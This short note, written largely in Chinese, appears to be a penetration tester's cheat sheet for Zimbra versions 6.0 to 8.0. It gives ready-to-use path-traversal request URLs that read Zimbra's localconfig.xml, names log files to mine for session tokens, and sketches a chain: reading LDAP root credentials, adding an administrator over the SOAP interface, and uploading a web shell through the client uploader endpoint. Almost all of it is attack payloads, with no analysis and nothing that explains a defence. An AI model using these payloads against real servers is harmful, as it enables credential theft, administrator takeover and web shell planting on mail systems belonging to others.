'''
zimbra
Version 6.0 7.0. 8.0
任意文件读取

默认日志路径
/var/log/zimbra.log
/opt/zimbra/jetty/logs/xxxx_xx_xx.trace.log%00

读session
添加cookie
bypass
'''

Zimbra Local File Inclusion
https://packetstormsecurity.com/files/124321/Zimbra-Local-File-Inclusion.html

/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00
/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00

本地文件包含,获取authtoken,上传shell到/download目录下
上传地址 /service/extension/clientUploader/upload

获取authtoken获取方式
    读取ldap root账户,通过soap接口添加管理员账户,
    读取session,获取authtoken





